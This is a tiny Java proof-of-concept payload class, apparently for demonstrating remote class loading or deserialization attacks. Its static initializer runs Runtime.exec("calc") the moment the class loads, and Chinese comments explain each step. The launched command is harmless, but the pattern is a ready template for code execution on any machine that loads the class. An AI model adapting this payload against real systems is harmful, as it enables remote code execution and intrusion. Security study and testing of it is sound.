package codebase.client;
import java.util.List;
import java.util.ArrayList;

public class Payload extends ArrayList{
    static {
        //执行exec命令需要抓取异常
        try {
            //获取Runtime对象
            Runtime rt = Runtime.getRuntime();
            //通过Runtime对象执行命令
            Process pc = rt.exec("calc");
            pc.waitFor();
        } catch (Exception e) {
            // do nothing;
        }
    }
}
